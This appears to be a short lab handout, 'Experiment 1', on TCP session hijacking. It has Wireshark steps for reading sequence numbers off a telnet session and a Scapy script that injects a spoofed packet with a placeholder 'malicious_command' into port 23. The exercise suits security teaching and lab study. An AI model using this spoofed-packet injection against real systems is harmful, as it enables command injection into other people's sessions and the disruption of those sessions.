✅ Experiment 1: TCP Session Hijacking using Scapy

Tools: Kali Linux, Scapy (Python)

Step-by-Step:

Step 1: Monitor a TCP session and get sequence number

Start Wireshark on interface (e.g. eth0):

sudo wireshark

Apply filter: tcp

Identify a session (e.g., telnet or HTTP) and note:

Source/Dest IP

Port

Sequence Number



Step 2: Craft spoofed packet

Use Scapy to inject a spoofed TCP packet:

from scapy.all import *

target_ip = "192.168.1.5"
source_ip = "192.168.1.10"
target_port = 23
source_port = 1024
seq_num = 123456789
ack_num = 987654321

packet = IP(src=source_ip, dst=target_ip)/TCP(sport=source_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num)/"malicious_command"
send(packet)

Step 3: Observe Disruption

Monitor victim terminal.

You’ll see spoofed commands executed or TCP session dropped.



